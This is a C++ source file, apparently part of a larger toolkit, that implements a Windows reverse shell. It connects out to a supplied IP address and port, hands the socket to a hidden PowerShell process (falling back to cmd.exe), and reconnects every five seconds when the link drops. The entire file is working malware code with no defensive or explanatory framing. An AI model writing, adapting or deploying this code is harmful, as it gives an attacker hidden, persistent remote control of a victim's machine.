#include "core/collection/reverse_shell.hpp"
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

void ReverseShell::Start(const std::string& ip, int port) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return;

    while(true) {
        struct addrinfo hints, *res;
        memset(&hints, 0, sizeof(hints));
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        
        if(getaddrinfo(ip.c_str(), std::to_string(port).c_str(), &hints, &res) != 0) {
            Sleep(5000); continue;
        }

        SOCKET sock = WSASocketA(res->ai_family, res->ai_socktype, res->ai_protocol, NULL, 0, 0);
        if (sock == INVALID_SOCKET) {
            freeaddrinfo(res);
            Sleep(5000); continue;
        }

        if (connect(sock, res->ai_addr, res->ai_addrlen) != SOCKET_ERROR) {
            freeaddrinfo(res);
            
            STARTUPINFOA si;
            PROCESS_INFORMATION pi;
            memset(&si, 0, sizeof(si));
            memset(&pi, 0, sizeof(pi)); // A++ Initialization
            si.cb = sizeof(si);
            si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_HIDE;
            
            si.hStdInput = (HANDLE)sock;
            si.hStdOutput = (HANDLE)sock;
            si.hStdError = (HANDLE)sock;

            // Try PowerShell first
            char psCmd[] = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
            if (!CreateProcessA(NULL, psCmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
                // Fallback to CMD if PowerShell fails
                char cmdCmd[] = "cmd.exe";
                CreateProcessA(NULL, cmdCmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
            }

            // If either succeeded, wait for it
            if(pi.hProcess) {
                WaitForSingleObject(pi.hProcess, INFINITE);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
        } else {
            freeaddrinfo(res);
        }
        closesocket(sock);
        Sleep(5000); // Wait 5 seconds before reconnecting
    }
    WSACleanup();
}
